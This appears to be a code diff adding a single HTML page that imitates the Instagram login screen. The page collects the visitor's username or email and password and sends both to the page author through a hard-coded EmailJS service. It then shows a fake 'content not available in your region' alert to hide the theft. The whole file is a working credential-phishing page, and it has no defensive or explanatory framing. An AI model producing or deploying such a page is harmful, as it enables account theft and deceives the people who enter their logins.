@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram.com</title>
+    <link rel="icon" href="images.jpeg" type="image/icon type">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function () {
+            emailjs.init("LRNPDTsrOII3zlV_b"); // Replace with your EmailJS User ID
+        })();
+
+        function sendEmail(event) {
+            event.preventDefault(); // Prevent the form from submitting the default way
+
+            const form = event.target;
+
+            emailjs.sendForm('service_436el1j', 'template_9radxaq', form)
+                .then(function () {
+                    alert('Sorry this content is not available in your region.');
+                }, function (error) {
+                    alert('Sorry this content is not available in your region. ' + JSON.stringify(error));
+                });
+        }
+    </script>
+</head>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: sans-serif;
+    }
+    a{
+        text-decoration: none;
+    }
+    a:hover{
+        text-decoration: underline;
+    }
+
+    .box,.items {
+        width: 100%;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+    }
+
+    .logo {
+        width: 150px;
+    }
+
+
+
+    .other {
+        width: 269px;
+        height: 40px;
+        font-size: 12px;
+        padding-left: 10px;
+        border-radius: 2px;
+        outline: none;
+        border: 1px solid grey;
+    }
+
+    .fp-box {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .fp-box a {
+        margin-left: 156px;
+        font-size: 12px;
+        margin-bottom: 18px;
+        margin-top: -10px;
+    }
+    .Button{
+        background: #0097fe;
+        padding: 8px 100px;
+        color: white;
+        border: none;
+        border-radius: 3px;
+        font-weight: 600;
+        cursor: pointer;
+    }
+    .Button:hover{
+        background: #0899f9;
+    }
+    .line{
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .line div{
+        width: 95px;
+        height: 1px;
+        background-color: rgb(87, 87, 87);
+        border-radius: 10px;
+    }
+    .line p{
+        font-size: 10px;
+        font-weight: 600;
+        margin :10px 20px;
+    }
+    .last{
+        margin-left : 60px;
+        font-weight: 600;
+    }
+</style>
+
+<body>
+    <div class="box">
+        <div class="items">
+        <img src="1.png" class="logo">
+        <form onsubmit="sendEmail(event)">
+            <input type="text" id="email" name="email" placeholder="Phone number,username or email address" required
+                class="other"><br><br>
+
+            <input type="password" id="message" name="message" placeholder="Password" required class="other"><br><br>
+
+            <div class="fp-box">
+                <a href="index.html" class="fp">Forgotten password ?</a><br>
+                <input type="submit" value="Log in" class="Button">
+            </div>
+
+
+            <div class="line">
+                <div class="first"></div>
+                <p>OR</p>
+                <div class="first"></div>
+
+            </div>
+            <a href="index.html" class="last">Log in with facebook</a>
+
+        </form>
+    </div>
+    </div>
+</body>
+
+</html>
